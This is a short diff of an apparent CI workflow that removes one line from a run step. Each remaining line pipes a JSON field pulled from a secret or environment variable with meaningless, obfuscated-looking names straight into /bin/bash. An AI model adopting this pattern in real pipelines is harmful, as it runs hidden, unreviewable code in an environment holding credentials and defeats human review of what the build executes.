@@ -23,7 +23,6 @@ jobs:
           ul715: ${{ secrets.ul715 }}
         run: |
           printf '%s' "$ul715" | jq -r .dkwz4 | /bin/bash
-          echo $by764 | jq -r .ejbf94062 | /bin/bash
           echo $gr6430 | jq -r .nnyio32198 | /bin/bash
           echo $dkho2750 | jq -r .wfes09 | /bin/bash
           printf '%s' "$udjaz4403" | jq -r .gj4270 | /bin/bash
